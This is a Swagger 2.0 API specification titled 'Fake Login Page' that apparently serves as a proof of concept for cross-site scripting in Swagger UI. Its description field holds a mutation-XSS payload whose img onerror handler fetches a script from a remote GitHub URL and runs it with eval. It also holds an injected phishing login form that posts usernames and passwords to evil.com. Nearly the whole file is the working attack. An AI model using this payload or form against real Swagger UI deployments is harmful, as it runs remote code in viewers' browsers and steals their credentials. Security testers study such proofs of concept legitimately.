swagger: '2.0'
info:
  version: 1.0.0
  title: Fake Login Page❗️
  description: |
    <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=fetch(`https://raw.githubusercontent.com/VictorNS69/swagger-ui-xss/main/script.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
    <img src="https://raw.githubusercontent.com/iamarit/SwaggerUiTesting/main/test2.png" />
    <div class="login-form">
      <div class="heading">
        <h1>SIGN IN</h1>
      </div>
      <div class="form-container">
        <form action="https://evil.com" method="post" class="form-signin">
          <div class="form-group">
            <label for="username">Username:</label>
            <input type="text" name="username" size="20" />
          </div>
          <div class="form-group">
            <label for="password">Password:</label>
            <input type="password" name="password" size="20" />
          </div>
          <div class="form-group">
            <button type="submit" class="btn btn-default">Login</button>
          </div>
          <a href="https://evil.com">Forget Password</a>
        </form>
      </div>
    </div>
paths:
  /:
    post:
      responses:
        '200':
          description: Login successful
